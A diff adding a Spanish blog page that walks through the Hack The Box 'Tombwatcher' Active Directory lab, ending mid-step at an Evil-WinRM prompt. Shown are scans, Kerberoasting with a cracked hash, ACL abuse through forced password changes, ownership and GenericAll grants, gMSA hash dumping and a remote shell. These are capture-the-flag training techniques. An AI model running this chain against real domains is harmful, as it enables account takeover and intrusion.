@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Tombwatcher | Borhub Blog</title>
+<meta name="keywords" content="Medium, ActiveDirectory, Kerberoasting, AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner, GenericALL, Restore-ADObject, ESC15">
+<meta name="description" content="Writeups sobre la máquina Tombwatcher en Active Directory de dificultad Media. Tras el reconocimiento y la enumeración SMB aprovecharemos cuentas con SPN para  realizar ataques Kerberoast y usaremos BloodHound para ver privilegios de los usuarios, a partir de las ACL encontradas explotaremos permisos como AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner y GenericAll sobre usuarios, restauraremos objetos AD y, finalmente, abusaremos de AD-CS (ESC15) con Certipy para escalar privilegios.">
+<meta name="author" content="Borhub">
+<link rel="canonical" href="https://borhuub.github.io/writeups/tombwatcher/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0c6701118f5c7e049c5fa8762210566ca9a5a1174e56560126f872ccc4e942a1.css" integrity="sha256-DGcBEY9cfgScX6h2IhBWbKmloRdOVlYBJvhyzMTpQqE=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://borhuub.github.io/writeups/tombwatcher/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://borhuub.github.io/writeups/tombwatcher/">
+  <meta property="og:site_name" content="Borhub Blog">
+  <meta property="og:title" content="Tombwatcher">
+  <meta property="og:description" content="Writeups sobre la máquina Tombwatcher en Active Directory de dificultad Media. Tras el reconocimiento y la enumeración SMB aprovecharemos cuentas con SPN para  realizar ataques Kerberoast y usaremos BloodHound para ver privilegios de los usuarios, a partir de las ACL encontradas explotaremos permisos como AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner y GenericAll sobre usuarios, restauraremos objetos AD y, finalmente, abusaremos de AD-CS (ESC15) con Certipy para escalar privilegios.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Medium">
+    <meta property="article:tag" content="ActiveDirectory">
+    <meta property="article:tag" content="Kerberoasting">
+    <meta property="article:tag" content="AddSelf">
+    <meta property="article:tag" content="ReadGMSAPassword">
+    <meta property="article:tag" content="ForceChangePassword">
+    <meta property="og:image" content="https://borhuub.github.io/logo_machines/tombwatcher.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://borhuub.github.io/logo_machines/tombwatcher.png">
+<meta name="twitter:title" content="Tombwatcher">
+<meta name="twitter:description" content="Writeups sobre la máquina Tombwatcher en Active Directory de dificultad Media. Tras el reconocimiento y la enumeración SMB aprovecharemos cuentas con SPN para  realizar ataques Kerberoast y usaremos BloodHound para ver privilegios de los usuarios, a partir de las ACL encontradas explotaremos permisos como AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner y GenericAll sobre usuarios, restauraremos objetos AD y, finalmente, abusaremos de AD-CS (ESC15) con Certipy para escalar privilegios.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://borhuub.github.io/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Tombwatcher",
+      "item": "https://borhuub.github.io/writeups/tombwatcher/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Tombwatcher",
+  "name": "Tombwatcher",
+  "description": "Writeups sobre la máquina Tombwatcher en Active Directory de dificultad Media. Tras el reconocimiento y la enumeración SMB aprovecharemos cuentas con SPN para  realizar ataques Kerberoast y usaremos BloodHound para ver privilegios de los usuarios, a partir de las ACL encontradas explotaremos permisos como AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner y GenericAll sobre usuarios, restauraremos objetos AD y, finalmente, abusaremos de AD-CS (ESC15) con Certipy para escalar privilegios.",
+  "keywords": [
+    "Medium", "ActiveDirectory", "Kerberoasting", "AddSelf", "ReadGMSAPassword", "ForceChangePassword", "WriteOwner", "GenericALL", "Restore-ADObject", "ESC15"
+  ],
+  "articleBody": "As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!\nReconocimiento ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.72 -oG ports Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 19:10 CEST Initiating SYN Stealth Scan at 19:10 Scanning 10.10.11.72 [65535 ports] Discovered open port 135/tcp on 10.10.11.72 Discovered open port 53/tcp on 10.10.11.72 Discovered open port 445/tcp on 10.10.11.72 Discovered open port 80/tcp on 10.10.11.72 Discovered open port 139/tcp on 10.10.11.72 Discovered open port 3269/tcp on 10.10.11.72 Discovered open port 49666/tcp on 10.10.11.72 Discovered open port 88/tcp on 10.10.11.72 Discovered open port 49691/tcp on 10.10.11.72 Discovered open port 49755/tcp on 10.10.11.72 Discovered open port 49729/tcp on 10.10.11.72 Discovered open port 636/tcp on 10.10.11.72 Discovered open port 389/tcp on 10.10.11.72 Discovered open port 49712/tcp on 10.10.11.72 Discovered open port 464/tcp on 10.10.11.72 Discovered open port 9389/tcp on 10.10.11.72 Discovered open port 5985/tcp on 10.10.11.72 Discovered open port 593/tcp on 10.10.11.72 Discovered open port 49692/tcp on 10.10.11.72 Discovered open port 49694/tcp on 10.10.11.72 Discovered open port 3268/tcp on 10.10.11.72 Completed SYN Stealth Scan at 19:11, 26.38s elapsed (65535 total ports) Nmap scan report for 10.10.11.72 Host is up, received user-set (0.036s latency). Scanned at 2025-06-14 19:10:49 CEST for 26s Not shown: 65514 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49691/tcp open unknown syn-ack ttl 127 49692/tcp open unknown syn-ack ttl 127 49694/tcp open unknown syn-ack ttl 127 49712/tcp open unknown syn-ack ttl 127 49729/tcp open unknown syn-ack ttl 127 49755/tcp open unknown syn-ack ttl 127​ Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds Raw packets sent: 131063 (5.767MB) | Rcvd: 35 (1.540KB) Copy ports\n❯ ports.py ports 🔍 Puertos encontrados: ➜ 53 ➜ 80 ➜ 88 ➜ 135 ➜ 139 ➜ 389 ➜ 445 ➜ 464 ➜ 593 ➜ 636 ➜ 3268 ➜ 3269 ➜ 5985 ➜ 9389 ➜ 49666 ➜ 49691 ➜ 49692 ➜ 49694 ➜ 49712 ➜ 49729 ➜ 49755 ¡Puertos copiados en el portapapeles! ❯ sudo nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49691,49692,49694,49712,49729,49755 10.10.11.72 -oN targeted Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 19:14 CEST Nmap scan report for 10.10.11.72 Host is up (0.037s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-14 21:14:02Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.tombwatcher.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:DC01.tombwatcher.htb | Not valid before: 2024-11-16T00:47:59 |_Not valid after: 2025-11-16T00:47:59 |_ssl-date: 2025-06-14T21:15:32+00:00; +3h59m55s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.tombwatcher.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:DC01.tombwatcher.htb | Not valid before: 2024-11-16T00:47:59 |_Not valid after: 2025-11-16T00:47:59 |_ssl-date: 2025-06-14T21:15:31+00:00; +3h59m54s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.tombwatcher.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:DC01.tombwatcher.htb | Not valid before: 2024-11-16T00:47:59 |_Not valid after: 2025-11-16T00:47:59 |_ssl-date: 2025-06-14T21:15:32+00:00; +3h59m55s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-06-14T21:15:31+00:00; +3h59m54s from scanner time. | ssl-cert: Subject: commonName=DC01.tombwatcher.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:DC01.tombwatcher.htb | Not valid before: 2024-11-16T00:47:59 |_Not valid after: 2025-11-16T00:47:59 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing Enumeración SMB ❯ nxc smb 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!' --shares SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\\henry:H3nry_987TGV! SMB 10.10.11.72 445 DC01 [*] Enumerated shares SMB 10.10.11.72 445 DC01 Share Permissions Remark SMB 10.10.11.72 445 DC01 ----- ----------- ------ SMB 10.10.11.72 445 DC01 ADMIN$ Remote Admin SMB 10.10.11.72 445 DC01 C$ Default share SMB 10.10.11.72 445 DC01 IPC$ READ Remote IPC SMB 10.10.11.72 445 DC01 NETLOGON READ Logon server share SMB 10.10.11.72 445 DC01 SYSVOL READ Logon server share ❯ nxc smb 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!' --users SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\\henry:H3nry_987TGV! SMB 10.10.11.72 445 DC01 -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.11.72 445 DC01 Administrator 2025-06-13 15:49:54 0 Built-in account for administering the computer/domain SMB 10.10.11.72 445 DC01 Guest 0 Built-in account for guest access to the computer/domain SMB 10.10.11.72 445 DC01 krbtgt 2024-11-16 00:02:28 0 Key Distribution Center Service Account SMB 10.10.11.72 445 DC01 Henry 2025-05-12 15:17:03 0 SMB 10.10.11.72 445 DC01 Alfred 2025-05-12 15:17:03 0 SMB 10.10.11.72 445 DC01 sam 2025-06-13 17:54:51 0 SMB 10.10.11.72 445 DC01 john 2025-06-13 15:27:43 0 SMB 10.10.11.72 445 DC01 [*] Enumerated 7 local users: TOMBWATCHER Kerberoast attack - targetedKerberoast Vemos que el usuario henry tiene permisos de WriteSNP sobre el usuario Alfred.\n❯ sudo ntpdate -s 10.10.11.72 Sincronizar hora con el DC En un principio trato de sincronizarme con ntpdate -s ip pero sigue sin funcionar el ataque con el mismo error y tampoco me cambia la hora de mi reloj.\n❯ sudo ntpdate -u 10.10.11.72 [sudo] contraseña para borhub: 15 Jun 00:14:43 ntpdate[55439]: step time server 10.10.11.72 offset +14394.782456 sec Probando más opciones de ntpdate, doy con -u que también sincroniza el reloj.\n❯ sudo ntpdate -u 10.10.11.72 [sudo] contraseña para borhub: 15 Jun 00:14:43 ntpdate[55439]: step time server 10.10.11.72 offset +14394.782456 sec También podemos usar la opción -q para sincronizar-nos con el servidor o para averiguar la zona horaria y luego manipular la hora de nuestra máquina atacante con el comando faketime.\n❯ sudo ntpdate -q 10.10.11.72 [sudo] contraseña para borhub: server 10.10.11.72, stratum 1, offset +0.002838, delay 0.06204 15 Jun 00:22:41 ntpdate[57861]: adjust time server 10.10.11.72 offset +0.002838 sec #Vemos que la hora del servidor es 00:22:41 Visto que me indica que me ha sincronizado la hora con el servidor, pruebo a lanzar otra vez el ataque kerberoast y esta vez si que conseguimos el hash.\n❯ python3 targetedKerberoast.py --dc-ip 10.10.11.72 -d 'TOMBWATCHER.htb' -u 'henry' -p 'H3nry_987TGV!' [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [+] Printing hash for (Alfred) $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$TOMBWATCHER.htb/Alfred*$8c2722939ffad8646047920d360dc4e8$d9705fa389ed2e1e72d1a5a68a5c38e10eb6b6df153faed7496499e28260399051f12af457db390023b54ad38df3d55fb303a3ca0b8e154cfa9ba2ea03cd7eb83acbc4ea9c500853f1cb750337dfa7a3dd7ddc1e5dd42e668d928d8b2f56ffb9f8c2d76d003b4787459c69414bb9ed0e3a7cc192c857abf0392312c7897865e3037125bd1ef25cd72144a6e02480023103969b10dd123eb702a625d3286f673b43b75759480a067a6effd6095d0c28f4819eef64f5416f8373bc3aaf307cb74f652e93e6376ea317fadbf83cc700b8d788c6aa8064b19e1aaa73bfe0576418e5fefb24f4282e25c4d10d44c29a0037f04e7e1d6ba7b5689011795eb39145a4dc0f4b293c14540ff034070972a946744b3a42455de702974752aae3d7f8bbce67283ad564c05e9ffb538205da4b7e56b9c6dbd247f6ae9178a7c36e2b0f1ee1e35b20b6722901c9c36da6cd65a9e65dfbbcf97c9288bda88658d268d80416cede07a82e6c5c6c6ce533f5523a85bce31e9b27a252da445b7785de430ee17244852ad57f64ed2b2f6787458eb2c63dd743aa6c55431186727938f863626b4bd925692fe4d1e5cc013a65d8f8006f1a6cce0c4ae68e4fbae33bcb8d3511de5528dbfe26eed8d5ec1e485bb56468d0622525da393646d4d21e5974cb622e85ec2aca56916032d0a23eb77b1cba3fbaf5e4caf1f84273a478f26d1a1b2b6865452fc13c5e1cbc2dedfb2041221e2770a0c1825c4290543e1fa55710e8e99830b9cf4a498fe3d195c520b143e712086f88ce5b4d7e20dc03d518bd865f2bb44656f275a1c0b2fabec542ac8a85cc4629efc864b741a0ddfc9bcc67b1be75444b6cdf83a0f98458015820206632d72db0242421bd6c8b4f6abe87be96d2bc50de184bc1c78d76e8503d199c8aba6219b63a71ef1ea64b8c86e39084147dd07c2d4d9b1296976de27a50309aef34b0ac0eb178814dd21fa82e1c856a1c914c50b463a296b349ec00b720c868a2c3f72546300bbf39d9da5a900da22c6b17361995c327d9aa647ebe81e50fd4f5bef2bc28b61f5cd43c5fd5388684921024c0c823bfa4c3d950006015f07bd6607dd855cbac71e88bd9337cec6496d4747257bce98d4352cc9de581bc8d23127a7d79c0f2cfd8a91d023ea8fdb8dfd9ec9adebd1191f99dc4ece36efa23ed8a551bf43bcf7c9ae1fc98ab6f8f48addef2c5f1345923d0b6acf0cce21e35446a580f275b536f335bf956dea430d8eba203a79b9b207368c05b43bf910f2210d304fcc7a3bc38f085108c64e2ad37a3fce5335bdf822b42c1ca96700006a831610dba97c4b1b6f8de32e362bcd03fa63f54c687156f79277a33bcda871adc6e162fc99d75d65e613a005722260d7f3e3aca39529076375ab80f829609314098647ad93cb8421b3bede1e52b6022a26e0fadc8b23af89024e7d60a01c2b26c0f7496683d1ab579ab8bdb09320fd0 Obtenemos el hash y lo crackeamos haciendo uso de hashcat:\n❯ hashcat -m 13100 --force -a 0 kerberohash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --force hashcat (v6.2.6) starting ....SNIP.... Dictionary cache hit: * Filename..: /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt * Passwords.: 14344384 * Bytes.....: 139921497 * Keyspace..: 14344384 $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$TOMBWATCHER.htb/Alfred*$8c2722939ffad8646047920d360dc4e8$d9705fa389ed2e1e72d1a5a68a5c38e10eb6b6df153faed7496499e28260399051f12af457db390023b54ad38df3d55fb303a3ca0b8e154cfa9ba2ea03cd7eb83acbc4ea9c500853f1cb750337dfa7a3dd7ddc1e5dd42e668d928d8b2f56ffb9f8c2d76d003b4787459c69414bb9ed0e3a7cc192c857abf0392312c7897865e3037125bd1ef25cd72144a6e02480023103969b10dd123eb702a625d3286f673b43b75759480a067a6effd6095d0c28f4819eef64f5416f8373bc3aaf307cb74f652e93e6376ea317fadbf83cc700b8d788c6aa8064b19e1aaa73bfe0576418e5fefb24f4282e25c4d10d44c29a0037f04e7e1d6ba7b5689011795eb39145a4dc0f4b293c14540ff034070972a946744b3a42455de702974752aae3d7f8bbce67283ad564c05e9ffb538205da4b7e56b9c6dbd247f6ae9178a7c36e2b0f1ee1e35b20b6722901c9c36da6cd65a9e65dfbbcf97c9288bda88658d268d80416cede07a82e6c5c6c6ce533f5523a85bce31e9b27a252da445b7785de430ee17244852ad57f64ed2b2f6787458eb2c63dd743aa6c55431186727938f863626b4bd925692fe4d1e5cc013a65d8f8006f1a6cce0c4ae68e4fbae33bcb8d3511de5528dbfe26eed8d5ec1e485bb56468d0622525da393646d4d21e5974cb622e85ec2aca56916032d0a23eb77b1cba3fbaf5e4caf1f84273a478f26d1a1b2b6865452fc13c5e1cbc2dedfb2041221e2770a0c1825c4290543e1fa55710e8e99830b9cf4a498fe3d195c520b143e712086f88ce5b4d7e20dc03d518bd865f2bb44656f275a1c0b2fabec542ac8a85cc4629efc864b741a0ddfc9bcc67b1be75444b6cdf83a0f98458015820206632d72db0242421bd6c8b4f6abe87be96d2bc50de184bc1c78d76e8503d199c8aba6219b63a71ef1ea64b8c86e39084147dd07c2d4d9b1296976de27a50309aef34b0ac0eb178814dd21fa82e1c856a1c914c50b463a296b349ec00b720c868a2c3f72546300bbf39d9da5a900da22c6b17361995c327d9aa647ebe81e50fd4f5bef2bc28b61f5cd43c5fd5388684921024c0c823bfa4c3d950006015f07bd6607dd855cbac71e88bd9337cec6496d4747257bce98d4352cc9de581bc8d23127a7d79c0f2cfd8a91d023ea8fdb8dfd9ec9adebd1191f99dc4ece36efa23ed8a551bf43bcf7c9ae1fc98ab6f8f48addef2c5f1345923d0b6acf0cce21e35446a580f275b536f335bf956dea430d8eba203a79b9b207368c05b43bf910f2210d304fcc7a3bc38f085108c64e2ad37a3fce5335bdf822b42c1ca96700006a831610dba97c4b1b6f8de32e362bcd03fa63f54c687156f79277a33bcda871adc6e162fc99d75d65e613a005722260d7f3e3aca39529076375ab80f829609314098647ad93cb8421b3bede1e52b6022a26e0fadc8b23af89024e7d60a01c2b26c0f7496683d1ab579ab8bdb09320fd0:basketball Session..........: hashcat Status...........: Cracked Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP) Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$TOMBWATCHER.htb...320fd0 Time.Started.....: Sun Jun 15 00:33:44 2025, (0 secs) Time.Estimated...: Sun Jun 15 00:33:44 2025, (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 16003.1 kH/s (6.26ms) @ Accel:1024 Loops:1 Thr:32 Vec:1 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 196608/14344384 (1.37%) Rejected.........: 0/196608 (0.00%) Restore.Point....: 0/14344384 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: 123456 -\u003e piggy! Hardware.Mon.#1..: Temp: 55c Util: 0% Core: 533MHz Mem:2400MHz Bus:16 Started: Sun Jun 15 00:33:33 2025 Stopped: Sun Jun 15 00:33:45 2025 Y usamos ncx para comprobar que las credenciales son validas:\n❯ nxc smb 10.10.11.72 -u 'Alfred' -p 'basketball' SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\\Alfred:basketball Enumeración con Bloodhound ❯ bloodhound-python -u Alfred -p 'basketball' -d TOMBWATCHER.HTB -ns 10.10.11.72 -c all --zip INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3) INFO: Found AD domain: tombwatcher.htb INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.tombwatcher.htb:88)] [Errno -2] Name or service not known INFO: Connecting to LDAP server: dc01.tombwatcher.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc01.tombwatcher.htb INFO: Found 9 users INFO: Found 53 groups INFO: Found 2 gpos INFO: Found 2 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: DC01.tombwatcher.htb INFO: Done in 00M 11S INFO: Compressing output into 20250615003825_bloodhound.zip Abusando de permisos AddSelf - BloodyAD Vemos que el usuario Alfred tiene permisos AddSelf, es decir, tiene la habilidad de añadirse al grupo INFRASTRUCTURE heredando sus permisos.\n❯ bloodyAD --host 10.10.11.72 -d 'TOMBWATCHER.HTB' -u 'Alfred' -p 'basketball' add groupMember 'INFRASTRUCTURE' 'Alfred' [+] Alfred added to INFRASTRUCTURE Una vez con el usuario añadido al grupo seguimos viendo que permisos tiene el grupo Infrastructure.\nAbusando de permisos ReadGMSAPassword - gMSADumper El grupo infrastructure tiene permisos ReadGMSAPassword sobre ANSIBLE_DEV$ que es un GroupManaged Service Account. Este permiso nos puede permitir obtener contraseñas de ANSIBLE_DEV$.\nUsando la herramienta gMSADumper.py podemos sustraer el hash:\n❯ python3 gMSADumper.py -u 'Alfred' -p 'basketball' -l 10.10.11.72 -d 'tombwatcher.htb' Users or groups who can read password for ansible_dev$: \u003e Infrastructure ansible_dev$:::4b21348ca4a9edff9689cdf75cbda439 ansible_dev$:aes256-cts-hmac-sha1-96:499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a ansible_dev$:aes128-cts-hmac-sha1-96:230ccd9df374b5fad6a322c5d7410226 Abusando de permisos ForceChangePassword - Net rpc Vemos el hash de ansible_dev$ y si miramos los permisos de la computadora ANSIBLE_DEV$ vemos que tiene permisos ForceChangePassword sobre SAM\n❯ net rpc password \"SAM\" 'Micontrafavorita123!' -U TOMBWATCHER.HTB/ANSIBLE_DEV$%'4b21348ca4a9edff9689cdf75cbda439' --pw-nt-hash -S \"10.10.11.72\" Abusando de permisos WriteOwner - BloodyAD Una vez sabiendo la contraseña de SAM vemos que SAM tiene permisos WriteOwner sobre el usuario Jhon.\nCon lo cual vamos a convertir a SAM en propietario del usuario JOHN con bloodyAD.\n❯ bloodyAD --host 10.10.11.72 -d TOMBWATCHER.htb -u 'SAM' -p 'Micontrafavorita123!' set owner 'JOHN' 'SAM' [+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by SAM on JOHN Y ahora nos damos permisos totales (GenericAll) sobre JOHN.\n​❯ bloodyAD --host 10.10.11.72 -d TOMBWATCHER.htb -u 'SAM' -p 'Micontrafavorita123!' add genericAll 'JOHN' 'SAM' [+] SAM has now GenericAll on JOHN Y ahora nos damos permisos totales (GenericAll) sobre JOHN.\n❯ bloodyAD --host 10.10.11.72 -d TOMBWATCHER.htb -u 'SAM' -p 'Micontrafavorita123!' add genericAll 'JOHN' 'SAM' [+] SAM has now GenericAll on JOHN Ahora con Net rpc cambiamos la contraseña de JOHN y comprobamos con nxc que haya funcionado correctamente.\n❯ net rpc password \"JOHN\" 'Micontrafavorita123!' -U TOMBWATCHER.HTB/SAM%'Micontrafavorita123!' -S \"10.10.11.72\" ❯ nxc smb 10.10.11.72 -u 'JOHN' -p 'Micontrafavorita123!' SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\\JOHN:Micontrafavorita123! ❯ evil-winrm -i 10.10.11.72 -u JOHN -p 'Micontrafavorita123!' Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\john\\Documents\u003e type ../Desktop/user.txt 559f53b2bf839cc2c6d10beece095160 Escalada de privilegios Abusando de permisos GenericAll sobre Organizational Units ACL Si miramos la enumeración en el bloodhound vemos que el usuario JHON tiene permisos GenericAll sobre la Unidad Organizativa (OU) ADCS. Este tipo de permisos puede ser utilizado para añadir una ACE con FullControl y herencia activada, comprometiendo todos los objetos hijos.\nUna ACE (Access Control Entry) es un elemento individual en una lista de control de acceso (ACL) que define los permisos para un usuario, grupo u objeto específico.\n❯ dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JOHN' -target-dn 'ou=ADCS,dc=TOMBWATCHER,dc=htb' 'tombwatcher.htb'/'JOHN':'Micontrafavorita123!' -dc-ip 10.10.11.72 2\u003e/dev/null Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU [*] DACL backed up to dacledit-20250615-040613.bak [*] DACL modified successfully! ❯ dacledit.py -action 'read' -principal 'JOHN' -target-dn 'ou=ADCS,dc=TOMBWATCHER,dc=htb' 'tombwatcher.htb'/'JOHN':'Micontrafavorita123!' -dc-ip 10.10.11.72 2\u003e/dev/null Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Parsing DACL [*] Printing parsed DACL [*] Filtering results for SID (S-1-5-21-1392491010-1358638721-2126982587-1106) [*] ACE[7] info [*] ACE Type : ACCESS_ALLOWED_ACE [*] ACE flags : CONTAINER_INHERIT_ACE [*] Access mask : FullControl (0xf01ff) [*] Trustee (SID) : john (S-1-5-21-1392491010-1358638721-2126982587-1106) [*] ACE[8] info [*] ACE Type : ACCESS_ALLOWED_ACE [*] ACE flags : CONTAINER_INHERIT_ACE, OBJECT_INHERIT_ACE [*] Access mask : FullControl (0xf01ff) [*] Trustee (SID) : john (S-1-5-21-1392491010-1358638721-2126982587-1106) Restaurar objetos en AD con PowerShell - RestoreAD-Object Una vez hemos heredado los permisos FullControl para los objetos dentro de la OU. Tenemos que ver que objetos tenemos disponibles. Dentro de Evil-WinRm comprobamos los objetos que han sido eliminados para ver si podemos restaurarlos:\nCómo Restaurar Objetos Borrados en Active Directory\n*Evil-WinRM* PS 